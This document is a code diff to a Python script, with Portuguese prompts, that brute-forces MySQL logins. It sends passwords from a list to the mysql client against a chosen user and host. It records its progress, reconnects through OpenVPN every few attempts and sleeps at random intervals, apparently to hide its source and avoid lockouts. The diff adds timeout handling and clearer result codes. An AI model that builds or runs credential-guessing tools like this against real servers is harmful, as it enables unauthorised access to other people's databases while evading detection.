@@ -2,7 +2,6 @@ import pexpect
 import random
 import passwords
 import time
-import sys
 import vpn
 
 passwords = passwords.passwords_
@@ -12,26 +11,39 @@ finded = False
 
 i = 0
 
+LOGIN_SUCCESS_MARIADB = 0
+LOGIN_SUCCESS_MYSQL = 1
+LOGIN_DENIED = 2
+END = 3
+TIMEOUT = 4
+
 i = int(input("Qual o valor inicial: "))
 
 user = input("Qual o usuário: ")
 destino = input("Qual o destino: ")
 
 next_ = random.randint(30, 45)
+next5 = 5
 
 while i < len(passwords):
 
     with open("/tmp/mysql_i", "w") as f:
         f.write(str(i))
 
-    process = pexpect.spawn("mysql", ["-u", user, "-p", destino], encoding="utf-8")
+    process = pexpect.spawn("mysql", ["-u", user, "-p", destino], encoding="utf-8", timeout=10)
 
     process.expect("Enter password:")
     process.sendline(str(passwords[i]))
 
-    result = process.expect(["MariaDB", "mysql", "ERROR 1698", pexpect.EOF])
+    result = process.expect([
+        "MariaDB",
+        "mysql",
+        "ERROR 1698",
+        pexpect.EOF,
+        pexpect.TIMEOUT,
+    ])
 
-    if result == 0 or result == 1:
+    if result in (LOGIN_SUCCESS_MARIADB, LOGIN_SUCCESS_MYSQL):
         password = passwords[i]
         print(password)
 
@@ -42,9 +54,23 @@ while i < len(passwords):
 
         break
 
-    if i % 5 == 0:
+    if result == LOGIN_DENIED:
+        print("Senha recusada pelo MySQL.")
+    elif result == END:
+        print("A conexão com o MySQL foi encerrada.")
+    elif result == TIMEOUT:
+        print("Tempo limite aguardando a resposta do MySQL.")
+
+    if result in (LOGIN_DENIED, END, TIMEOUT):
+        process.close()
+        i += 1
+        continue
+
+    if i == next5:
         openvpn_enter.close()
         openvpn_enter = vpn.openvpn_enter_()
+        
+        next5 += 5
 
     if i == next_:
         time.sleep(random.randint(30, 180))
